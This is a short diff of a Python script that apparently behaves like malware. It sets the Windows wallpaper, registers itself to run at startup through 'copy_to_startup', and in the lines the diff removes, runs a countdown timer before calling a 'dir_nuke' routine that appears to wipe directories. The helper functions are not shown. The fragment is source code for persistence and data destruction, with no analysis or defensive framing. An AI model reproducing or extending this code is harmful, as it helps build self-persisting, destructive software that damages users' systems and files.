@@ -100,15 +100,6 @@ def change_wallpaper():
         file.write(image_data)
     ctypes.windll.user32.SystemParametersInfoW(20, 0, os.path.abspath(wallpaper_file), 3)
     os.remove(wallpaper_file)
-
-def countdown(t):
-    while t:
-        mins, secs = divmod(t, 60)
-        timer = '{:02d}:{:02d}'.format(mins, secs)
-        print(timer, end="\r")
-        time.sleep(1)
-        t -= 1
-    dir_nuke()
         
 if __name__ == "__main__":
     copy_to_startup()
